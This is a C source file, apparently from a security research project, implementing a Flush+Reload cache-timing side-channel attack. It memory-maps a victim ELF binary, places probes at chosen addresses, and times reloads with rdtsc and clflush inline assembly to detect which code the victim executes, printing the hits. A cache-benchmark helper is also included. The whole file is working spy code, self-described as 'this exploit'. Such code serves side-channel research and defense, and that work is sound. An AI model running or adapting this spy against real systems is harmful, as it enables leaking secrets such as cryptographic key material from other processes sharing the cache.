// Copyright (C) 2020 Assured Information Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <signal.h>

#include "elfstuff.h"
#include "flushplusreload.h"


char test_str[] = "de Finibus Bonorum et Malorum";

volatile sig_atomic_t sig_received = 0;

typedef struct slot_state {
    unsigned long probe_time[MAX_PROBES];
    unsigned long missed;
} slot_t;

void sighandler(int signum) {
   sig_received = 1;
}


/* 
* read time stamp counter and return the lower 32-bits that are stored in %eax
* 'lfence' ensures 'rdtsc' only executes after all previous instructions have 
* executed and all previous loads are globally visible. 
*/
__attribute__((always_inline))
inline unsigned long gettime() 
{
    volatile unsigned long tl;

    __asm__ __volatile__(
        " lfence              \n"
        " rdtsc               \n"
        /* Extended assembly */ 
        : "=a" (tl)          /* output %eax */
        :                    /* input */ 
        : "%edx");           /* clobbered registers */           
  return tl;
}

/* 
* This is the the heart of this exploit. 'mfence' and 'lfence; "serialize" the 
* instrunction stream. 'rdtsc' grabs the time and returns the lower 32-bits to 
* %eax. We ignore the upper 32-bits stored in %edx. we store the lower 32-bits 
* in %esi. This grabs the time before the "RELOAD". 

* The address of the probe is stored in %ecx.
* '''
*   movl (%1), %%eax <= This is the RELOAD
* '''
* grabs 4-bytes from the mem address in %ecx

* After the "RELOAD" the time stamp is read again and subtracted from the first 
* read. Then the address of the probe is flushed from all levels of the cache 
* hierarchy with 'clflush'.

* Without 'clflush' being executable from user space this exploit would not work. 
*/ 
__attribute__((always_inline))
inline int reload_time_flush(char *adrs) 
{
   volatile unsigned long time;

    __asm__ __volatile__ (
        "  mfence             \n"
        "  lfence             \n"
        "  rdtsc              \n"  /* Grab time before */
        "  lfence             \n"
        "  movl %%eax, %%esi  \n"
        "  movl (%1), %%eax   \n"  /* RELOAD */
        "  lfence             \n"
        "  rdtsc              \n"  /* Grab time after */
        "  subl %%esi, %%eax  \n"  /* Meassure difference in time */
        "  clflush 0(%1)      \n"  /* FLUSH */ 
        /* Extended assembly */ 
        : "=a" (time)        /* output %eax */
        : "c" (adrs)         /* input  %ecx */
        :  "%esi", "%edx");  /* clobbered registers */
    return time;
}

/*
*  Same as above w/o clflush 
*  Used to get cache bench.
*/
__attribute__((always_inline))
inline int reload_time(char *adrs) 
{
   volatile unsigned long time;

    __asm__ __volatile__ (
        "  mfence             \n"
        "  lfence             \n"
        "  rdtsc              \n"  /* Grab time before */
        "  lfence             \n"
        "  movl %%eax, %%esi  \n"
        "  movl (%1), %%eax   \n"  /* RELOAD */
        "  lfence             \n"
        "  rdtsc              \n"  /* Grab time after */
        "  subl %%esi, %%eax  \n"  /* Meassure difference in time */
        /* Extended assembly */ 
        : "=a" (time)        /* output %eax */
        : "c" (adrs)         /* input  %ecx */
        :  "%esi", "%edx");  /* clobbered registers */
    return time;
}

/* FLUSH */
__attribute__((always_inline))
inline void flush(char *adrs)
{
    __asm__ __volatile__ (
        " mfence             \n"
        " clflush 0(%0)      \n"  /*FLUSH */
        /* Extended assembly */ 
        :                    /* output */ 
        : "r" (adrs)         /* input (any available general purpose register) */
        : );                 /* clobbered registers */ 
}

void print_slot_buffer(const slot_t *buffer, int buffer_pos, const probe_t *probes, 
                       int probe_index, int threshold)
{
    int i, j = 0;
    
    for (i = 0; i < buffer_pos; i++) 
    {
        for (j = 0; j < probe_index; j++) 
        {
            if (buffer[i].probe_time[j] <= threshold)
            {
                printf("%c", probes[j].name);
            }

            /* how many slots did we miss */ 
            if (buffer[i].missed > 0){
                printf("{%lu}", buffer[i].missed);
            }
        }
    }    
    printf("\n");
}

int attack_loop(int threshold, unsigned long slot, probe_t *probes, int probe_index)
{
    int i;
    int hit;
    int quiet_len = 0;
    int buffer_pos = 0;

    slot_t buffer[MAX_SLOT_SIZE];
    
    unsigned int current_slot_start;
    unsigned int current_slot_end;
    unsigned int current_time;
    unsigned int last_completed_slot;

    /* FLUSH all probes */
    for (i = 0; i < probe_index; i++)
    {
        flush(probes[i].mapped_pointer);
    }

    /* Signals to handle */ 
    signal(SIGINT, sighandler);
    signal(SIGTERM, sighandler);

    /* Attack loop */
    last_completed_slot = gettime();
    while(0 == sig_received)
    {
        hit = 0;
        /* This slot will be considered to start at the last time that was
         * divisible by the slot size. */
        current_slot_start = gettime();
        /* This slot will end at the next time divisible by the slot size. */
        current_slot_end = current_slot_start + slot;

        /* calculate the number of slots misseed */
        buffer[buffer_pos].missed = (current_slot_start - last_completed_slot) / slot;

        /* Stop if RDTSC ever fails to be monotonic. */
        if (current_slot_start < last_completed_slot) {
            printf("Monotonicity failure!!!\n");
            printf("Current Start: %u. Last end: %u\n", current_slot_start, last_completed_slot);
            return(-1);
        }

        /* Measure and reset the probes from the PREVIOUS slot. */
        for (i = 0; i < probe_index; i++) 
        {
            buffer[buffer_pos].probe_time[i] = reload_time_flush(probes[i].mapped_pointer);
            /* We don't make the hit decision yet, we do that when we print the
             * buffer. */
            if (buffer[buffer_pos].probe_time[i] <= threshold) 
            {
                hit = 1;
            }
        }

        /* If hit reset quiet_len */
        if (1 == hit)
        {
            quiet_len = 0;
        }
        else
        {
            quiet_len++; 
        }
      
        /* Advance to next pos*/
        if (1 == hit)
        {
            buffer_pos++;
        }

        /* Didn't collect enough info in time dump everything */
        if (buffer_pos >= 1 && (quiet_len >= MAX_SLOT_SIZE)) 
        {
            buffer_pos = 0;
        }

        /* Wait for this slot to end. */
        do 
        {
            current_time = gettime();
        } while (current_slot_end - current_time < slot); 

        last_completed_slot = current_time;

        /* If we've reached the end of the buffer, dump it. */
        if (buffer_pos >= slot)
        {
            print_slot_buffer(buffer, buffer_pos, probes, probe_index, threshold);
            buffer_pos = 0;
            return 0; /* got what we needed...get out*/ 
        }
    }

    return 0; 
}

int set_probe_pointers(void* binary, unsigned long size, int probe_index, probe_t *probes, int load_addr)
{
    int i;
    probe_t *probe;

    for (i = 0; i < probe_index; i++) 
    {
            probe = &probes[i];
            
            if (probe->virt_addr < load_addr) 
            {
                fprintf(stderr, "Virtual address 0x%ld is too low.\n", probe->virt_addr);
                return -1;
            }
           
            if (probe->virt_addr >= load_addr + size) 
            {
                fprintf(stderr, "Virtual address 0x%ld is too high (%x, %lx).\n", probe->virt_addr, load_addr, size);
                return -1; 
            }
          
            probe->mapped_pointer = binary + (probe->virt_addr - load_addr);
    }

    return 0;
}


void cache_bench()
{
    int i;  
    int samples = 100000;
    int flush_flag = 0;
    int flush_arr[samples];
    unsigned int *times = calloc(samples, sizeof(unsigned int));
    if (times == NULL) {
        return;
    }

    for (i = 0; i < samples; i++)
    {
        /* Flush the first time, and then every second time. */
        /* So that it's uncached, cached, uncached, cached, ... */
        flush_flag = 0;

        if (i % 2 == 0)
        {
            flush(test_str);
            flush_flag = 1;
        }

        times[i] = reload_time(test_str);
        flush_arr[i] = flush_flag;
    }
     
    for (i = 0; i < samples; i++) 
    {
        printf("%d: %u\n", flush_arr[i], times[i]);
    }

    free(times);
}


int spy(const args_t *args)
{
    /* pull out args should have already been validated */ 
    char *elf_path = args->elf_path;
    int threshold = args->threshold;
    unsigned long slot = args->slot;
    probe_t *probes = args->probes;
    int probe_index = args->probe_index;

    int rc;
    int load_addr;
    unsigned long size; 
    void *binary = NULL; 

    /* Find the offset for the virtual address */
    load_addr = get_elf_load_offset(elf_path);
    if (load_addr < 0)
    {
        return -1;
    }

    /* Memory map the victim binary */ 
    binary = map(elf_path, &size);
    if (NULL == binary)
    {
        return -1;
    }

    /* Set pointers to the probe addresses. */
    rc = set_probe_pointers(binary, size, probe_index, probes, load_addr);
    if (rc < 0) 
    {
        return -1;
    }
    
    /* Start the attack */
    rc = attack_loop(threshold, slot, probes, probe_index);

    return rc;
}
